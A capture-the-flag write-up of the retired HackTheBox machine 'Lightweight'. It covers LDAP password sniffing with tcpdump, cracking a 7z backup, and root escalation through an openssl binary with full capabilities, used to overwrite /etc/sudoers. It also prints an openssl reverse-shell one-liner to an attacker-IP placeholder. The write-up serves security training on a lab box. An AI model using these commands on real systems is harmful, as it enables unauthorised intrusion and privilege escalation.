---
title: HTB: Lightweight
url: https://0xdf.gitlab.io/2019/05/11/htb-lightweight.html
date: 2019-05-11T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-lightweight, nmap, php, linux, centos, ssh, fail2ban, ldap, tcpdump, wireshark, credentials, bruteforce, hashcat, capabilities, openssl, htb-ethereal, sudoers, arbitrary-write, oscp-plus-v1, oscp-plus-v2
---

![Lightweight-cover](https://0xdfimages.gitlab.io/img/lightweight-cover.png)

Lightweight was relatively easy for a medium box. The biggest trick was figuring out that you needed to capture ldap traffic on localhost to get credentials, and getting that traffic to generate. The box actually starts off with creating an ssh account for me when I visit the webpage. From there I can capture plaintext creds from ldap to escalate to the first user. I’ll crack a backup archive to get creds to the second user, and finally use a copy of `openssl` with full Linux capabilities assigned to it to escalate to root. In Beyond root, I’ll look at the backup site and the real one, and how they don’t match, as well as look at the script for creating users based on http visits.

## Box Info

| Name | [Lightweight](https://hackthebox.com/machines/lightweight)  [Lightweight](https://hackthebox.com/machines/lightweight) [Play on HackTheBox](https://hackthebox.com/machines/lightweight) |
| --- | --- |
| Release Date | [08 Dec 2018](https://twitter.com/hackthebox_eu/status/1071124483384082432) |
| Retire Date | 11 May 2019 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Lightweight |
| Radar Graph | Radar chart for Lightweight |
| First Blood User | 01:00:34[deviate deviate](https://app.hackthebox.com/users/73696) |
| First Blood Root | 03:44:48[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [0xEA31 0xEA31](https://app.hackthebox.com/users/13340) |

## Recon

### nmap

`nmap` reveals three services, ssh (22), http (80), and ldap (389):

```

root@kali# nmap -sT -p- --min-rate 10000 -sV -sC -oA nmap/alltcpscripts 10.10.10.119

Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-11 09:49 EST
Nmap scan report for 10.10.10.119
Host is up (0.020s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time

```

Based on the Apache version this looks like Centos 7.

### Website - TCP 80

The site is just a demo for [slendr](https://github.com/joseluisq/slendr), “A responsive & lightweight slider for modern browsers.”.

On visit, there’s an overlay that goes away when clicking off of it:

![1544543293600](https://0xdfimages.gitlab.io/img/1544543293600.png)

The info page (`/info.php`) gives more details:

![1544543316081](https://0xdfimages.gitlab.io/img/1544543316081.png)

The user page (`/user.php`) tells how to get ssh on the box:

![1544543357022](https://0xdfimages.gitlab.io/img/1544543357022.png)

There’s some interesting language here. It says that within one minute of my first http request, my account will be added. That implies that there’s a cron running each minute, checking for new http connections, and adding a new account if necessary.

The status page (`/status.php`) gives the (now empty) list of banned ips:

![1557030803040](https://0xdfimages.gitlab.io/img/1557030803040.png)

### LDAP - TCP 389

`nmap` script gives info about ldapuser1 and ldapuser2:

```

root@kali# nmap -p 389 --script ldap-search 10.10.10.119
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-11 10:19 EST
Nmap scan report for 10.10.10.119
Host is up (0.018s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search:
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds

```

Despite the box name indicating that LDAP would be a part of this box, there isn’t much I can get from here. The passwords don’t crack. I’ll move on.

## Shell as ldapuser2

### SSH as [ip]

I’ll use the ssh access granted by visiting the webpage to get on the host and look around. There isn’t a ton to find. The homedir is empty. I can see other homedirs for other users, including ips and the two users I found with ldap enumeration:

```

[10.10.14.3@lightweight home]$ ls
10.10.10.119  10.10.14.3  10.10.14.14  10.10.14.18  10.10.14.2  ldapuser1  ldapuser2

```

I can’t access the files in the web directory to look for passwords or how the system is creating users there.

### Sniff Password Via LDAP

#### Strategy

When I stop and think about what *may* be going on when I visit the site, it seems like somewhere it is logged that I’ve visited, and once a minute, the cron runs and looks at that log. A full user is being created, as I can see not only homedirs, but also entries in `/etc/passwd`:

```

[10.10.14.3@lightweight html]$ tail /etc/passwd
tcpdump:x:72:72::/:/sbin/nologin
ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
ldapuser1:x:1000:1000::/home/ldapuser1:/bin/bash
ldapuser2:x:1001:1001::/home/ldapuser2:/bin/bash
10.10.14.2:x:1002:1002::/home/10.10.14.2:/bin/bash
10.10.14.18:x:1003:1003::/home/10.10.14.18:/bin/bash
10.10.10.119:x:1005:1005::/home/10.10.10.119:/bin/bash
10.10.14.14:x:1006:1006::/home/10.10.14.14:/bin/bash
10.10.14.3:x:1004:1004::/home/10.10.14.3:/bin/bash

```

Given that, and the fact that ldap is listening, I’m going to hypothesize that the cron will use ldap to add the user (spoiler: it isn’t, but another page is using ldap). If I sniff for that traffic on localhost, I might be able to catch it (spoiler: I can).

#### tcpdump

I’ll run `tcpdump` with the following options:
- `-i lo` - listen on localhost
- `-nn` - don’t convert hostnames or ports to names
- `-X` - packet print data in ASCII and hex
- `-s 0` - capture entire packet
- ` ‘port 389’` - filter to capture only ldap traffic

So I started `tcpdump` and visited the page, and tried resetting my user. After waiting a while, I didn’t get any traffic. However, once I started clicking around again, I got ldap traffic on visiting `status.php`. This packet was most interesting:

```

[10.10.14.3@lightweight ~]$ tcpdump -i lo -nnXs 0 'port 389'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...[snip]...
06:16:44.588923 IP 10.10.10.119.36488 > 10.10.10.119.389: Flags [P.], seq 1:92, ack 1, win 683, options [nop,nop,TS val 541880593 ecr 541880593], length 91
        0x0000:  4500 008f a0c8 4000 4006 709f 0a0a 0a77  E.....@.@.p....w
        0x0010:  0a0a 0a77 8e88 0185 26a9 d1d8 aa44 7d50  ...w....&....D}P
        0x0020:  8018 02ab 2983 0000 0101 080a 204c 7111  ....)........Lq.
        0x0030:  204c 7111 3059 0201 0160 5402 0103 042d  .Lq.0Y...`T....-
        0x0040:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
        0x0050:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
        0x0060:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
        0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
        0x0080:  3130 3564 3365 3533 6164 3339 6163 32    105d3e53ad39ac2
...[snip]...

```

That’s the authentication packet. I can see it better if i use `tcpdump` to save the pcap, bring it back to my box, and open it in Wireshark.

![1557034227649](https://0xdfimages.gitlab.io/img/1557034227649.png)

It’s tempting to think that the password here is being sent as a hash, but that doesn’t actually make sense. I already observed in my ldap enumeration that the passwords were stored in the format `$6$`, [which is sha512](https://hashcat.net/wiki/doku.php?id=example_hashes). So if the host only knows the password as sha512, send it what looks like an md5 doesn’t make sense. There’s no way for the host to compare those two and see if they match.

Beyond that logic, I can also see that ldap sends the password [in plain text](https://www.tldp.org/HOWTO/LDAP-HOWTO/authentication.html).

### su

Armed with ldapuser2’s password, I can now `su` within my ssh session:

```

[10.10.14.3@lightweight ~]$ su ldapuser2
Password: 
[ldapuser2@lightweight 10.10.14.3]$ id
uid=1001(ldapuser2) gid=1001(ldapuser2) groups=1001(ldapuser2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

I can also grab `user.txt`:

```

[ldapuser2@lightweight ~]$ cat user.txt 
8a866d3b...

```

## Privesc: ldapuser2 –> ldapuser1

### Enumeration

In ldapuser2’s homedir, there’s a `backup.7z`:

```

[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt

```

### Crack Password

I’ll grab a copy and take a look on my local machine. When I try to open it, it asks for a password:

```

root@kali# 7z x backup.7z 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,3 CPUs Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3411 bytes (4 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1

Enter password (will not be echoed):

```

I can crack that password using `7z2john.pl` and `hashcat`:

```

root@kali# /opt/john/run/7z2john.pl backup.7z > backup.hash

```

```

$ hashcat -m 11600 -a 0 -o backup.cracked backup.hash /usr/share/wordlists/rockyou.txt --force
$ cat backup.cracked
delete

```

### Find Creds

Now I can see the contents, which is a backup of the web directories:

```

root@kali# ls -l backup
total 21
-rwxrwx--- 1 root vboxsf 4218 Jun 13  2018 index.php
-rwxrwx--- 1 root vboxsf 1764 Jun 13  2018 info.php
-rwxrwx--- 1 root vboxsf  360 Jun 10  2018 reset.php
-rwxrwx--- 1 root vboxsf 2400 Jun 14  2018 status.php
-rwxrwx--- 1 root vboxsf 1528 Jun 13  2018 user.php

```

In `status.php`, I’ll find creds for ldapuser1 (I’ll look more at the script in [Beyond Root](#which-ldap-creds--statusphp)):

```

$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';

```

### su

Now I can `su` to get a shell as ldapuser1:

```

[ldapuser2@lightweight ~]$ su ldapuser1
Password: 
[ldapuser1@lightweight ldapuser2]$ id
uid=1000(ldapuser1) gid=1000(ldapuser1) groups=1000(ldapuser1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

## Privesc: ldapuser1 –> root

### Enumeration

Checking out the homedir for ldapuser1, I see a few interesting files:

```

[ldapuser1@lightweight ~]$ ls -l
total 1484
-rw-rw-r--. 1 ldapuser1 ldapuser1   9714 Jun 15  2018 capture.pcap
-rw-rw-r--. 1 ldapuser1 ldapuser1    646 Jun 15  2018 ldapTLS.php
-rwxr-xr-x. 1 ldapuser1 ldapuser1 555296 Jun 13  2018 openssl
-rwxr-xr-x. 1 ldapuser1 ldapuser1 942304 Jun 13  2018 tcpdump

```

`ldapTLS.php` seems to a be a demo script for ldap over TLS in php. `capture.pcap` has 4 streams, which show ldap connections over ipv6 using ldapuser2’s credentials, so not much there, as I already have that.

`openssl` and `tcpdump` are strange things to find in a homedir. Both already exist in their normal paths:

```

[ldapuser1@lightweight ~]$ which tcpdump 
/usr/sbin/tcpdump
[ldapuser1@lightweight ~]$ which openssl 
/usr/bin/openssl

```

So what is different about these? The binaries are the same:

```

[ldapuser1@lightweight ~]$ md5sum openssl /usr/bin/openssl tcpdump /usr/sbin/tcpdump 
fba9d597671181560afeec189d92348c  openssl
fba9d597671181560afeec189d92348c  /usr/bin/openssl
d9e3583b74ec93b4c9c792be985d1b8b  tcpdump
d9e3583b74ec93b4c9c792be985d1b8b  /usr/sbin/tcpdump

```

When I check the [capabilities](https://linux-audit.com/linux-capabilities-101/), I find an important difference. For `tcpdump`, it’s the same. But for `openssl`, there’s nusual capabilitie for this copy:

```

[ldapuser1@lightweight ~]$ getcap tcpdump /usr/sbin/tcpdump
tcpdump = cap_net_admin,cap_net_raw+ep
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
[ldapuser1@lightweight ~]$ getcap openssl /usr/bin/openssl 
openssl =ep

```

Having the capability `=ep` means the binary has *all* the capabilities. So this `openssl` binary is useful to me.

### Read as root

The simplest next step is to read the flag as root. I can do that simply by using `openssl` to base64 the flag, and then pipe that into `base64 -d`:

```

[ldapuser1@lightweight ~]$ ./openssl base64 -in /root/root.txt | base64 -d
f1d4e309...

```

### root Shell

Of course I want a root shell, and arbitrary read and write offers many paths on Linux. One path that might be tempting is to use `openssl` to get a shell, using something like [this](https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998) or like I did in [Ethereal](/2019/03/09/htb-ethereal.html#shell-via-openssl). That would be using something like:

```

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s

```

The reason that won’t work is because while the `openssl` process has capabilities, the `/bin/sh` does not, so that shell will still run without the abilities I am looking for.

But, I can fall back to things like adding a user in `/etc/passwd`, overwriting a suid binary, or adding a root cron job. In this case, I’ll edit `/etc/sudoers`.

First I’ll make a copy of the existing file in `/dev/shm`. Then I’ll add a line to allow my current user to

```

[ldapuser1@lightweight ~]$ ./openssl base64 -in /etc/sudoers | base64 -d > /dev/shm/t
[ldapuser1@lightweight ~]$ echo "ldapuser1    ALL=(ALL)       ALL" >> /dev/shm/t
[ldapuser1@lightweight ~]$ cat /dev/shm/t | base64 | ./openssl enc -d -base64 -out /etc/sudoers

```

Now I have an entry in the `sudoers` file, so I can `sudo su`:

```

[ldapuser1@lightweight ~]$ sudo su
[sudo] password for ldapuser1:
[root@lightweight ldapuser1]# 

```

## Beyond Root

### Which ldap Creds / status.php

When I found ldapuser1’s creds in the `backup.7z` file, I was confused. I had identified that visiting `status.php` initiated ldap activity, but I had captured activity from ldapuser2. Once I had a shell as root, I went into the web directories and grabbed a copy of `status.php`. Turns out I was right:

```

root@kali# diff status.php status.php.actual
1c1
< <!DOCTYPE html>
---
> CTYPE html>
23,24c23,24
< $username = 'ldapuser1';
< $password = 'f3ca9d298a553da117442deeb6fa932d';
---
> $username = 'ldapuser2';
> $password = '8bc8251332abe1d7f105d3e53ad39ac2';
34c34
< $dn="uid=ldapuser1,ou=People,dc=lightweight,dc=htb";
---
> $dn="uid=ldapuser2,ou=People,dc=lightweight,dc=htb";

```

The backup file did use different creds than the live version on target.

While I’m looking at `status.php`, it’s not clear to me why this ldap connection is made from the status page. It just makes the connection, and assuming it succeeds, prints a static message, which is what I’ve seen on each visit to the page.

### User Creation

I was interested to see how the user creation worked on this host. As I was suspecting it was a cron, I found it using `crontab`:

```

[root@lightweight cron.d]# crontab -l
* * * * * /root/manageusers.sh >> /root/manageusers.log 2>/dev/null

```

Here’s the script, broken into sections and with line numbers added by me. Lines 1-9 are the shebang and defining a function, `cryptpw()`, that will take an argument and return a salted and hashed password string like I would see in `/etc/shadow`:

```

  1 #! /bin/bash
  2 #
  3 # encrypt a cleartext password given as arg
  4 cryptpw(){
  5         perl -e '
  6         my $pw = "'"$1"'";
  7         my $salt = join("",("a".."z")[rand 26,rand 26]);
  8         printf "%s\n", crypt($pw,$salt);'
  9 }

```

Next, in 11-23, the script reads the first column of `/var/www/html/reset_req`, which gives a list of IP addresses which have requested reset. Then it gets a unique list using `sort -u`, and that list is fed into a while loop. For each ip, it checks that the input is actually an ip, and if so, runs `/usr/sbin/userdel -f -r "$resetuser"` to delete the user. Once it’s processed the list, it clears it.

```

 11 awk '{print $1}' /var/www/html/reset_req | sort -u |
 12 while read line
 13 do
 14     resetuser=$line
 15 
 16     if [[ $resetuser =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
 17       /usr/sbin/userdel -f -r "$resetuser"
 18     else
 19       echo "fail to validate user"
 20     fi
 21 done
 22 
 23 truncate -s 0 /var/www/html/reset_req

```

In lines 25-35, it handles creation of new users. It gets the first column of the access\_log, which is the ip address, as the log format looks like:

```
10.10.14.3 - - [05/May/2019:05:16:10 +0100] "GET / HTTP/1.1" 200 4218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"  

```

It then uses `sort -u` here again to get rid of duplicate addresses, and then loops over that list. For each ip, it will run `id "$newuser"` ignoring the results, but if it is not successful (the user doesn’t exist), it creates the user with `useradd`:

```

 25 awk '{print $1}' /var/log/httpd/access_log | sort -u |
 26 while read line
 27 do
 28     newuser=$line
 29     if id "$newuser" >/dev/null 2>&1; then
 30       :
 31     else
 32       pw=$(cryptpw "$newuser")
 33       /usr/sbin/useradd "$newuser" -K MAIL_DIR=/dev/null -p "$pw"
 34     fi
 35 done

```

Finally, the script will update the list of banned ips in lines 37-40. It gets the list of fail2ban ips, greps to just get the ip from the log, and then sorts it to get rid of duplicates. It puts that list into `/var/www/html/banned.txt`. Then it creates an html list and overwrites the original list via a temporary file.

```

 37 # get banned ip
 38 
 39 /usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt
 40 awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt

```